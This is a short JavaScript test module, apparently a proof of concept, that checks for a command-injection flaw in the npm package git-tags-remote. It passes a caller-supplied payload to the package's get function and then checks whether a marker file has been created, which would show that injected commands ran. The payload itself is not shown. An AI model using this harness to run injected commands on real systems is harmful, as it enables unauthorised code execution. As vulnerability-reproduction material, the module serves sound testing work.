function exploitFunction(payload) {
  const gitTagsRemote = require("git-tags-remote");
  const fs = require("fs");
  const path = "./git-tags-remote";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  const file_exist = fs.existsSync(path);

  expect(file_exist).toBe(false);

  return gitTagsRemote
    .get(payload)
    .finally((tags) => {
      const file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
}

module.exports = { exploitFunction };